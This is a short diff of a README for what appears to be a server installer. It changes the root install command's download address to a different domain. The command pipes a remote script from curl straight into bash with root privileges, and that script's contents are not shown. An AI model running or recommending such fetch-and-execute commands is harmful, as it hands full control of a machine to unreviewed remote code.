@@ -21,7 +21,7 @@ Perfect for devs, hosters, and late-night sysadmins running on coffee ☕.
 Run this command as **root** or with **sudo**:
 
 ```bash
-bash <(curl -s https://ptero.nobitapro.online)
+bash <(curl -s https://alphax.znx.qzz.io)
 ```
 
 That’s it.
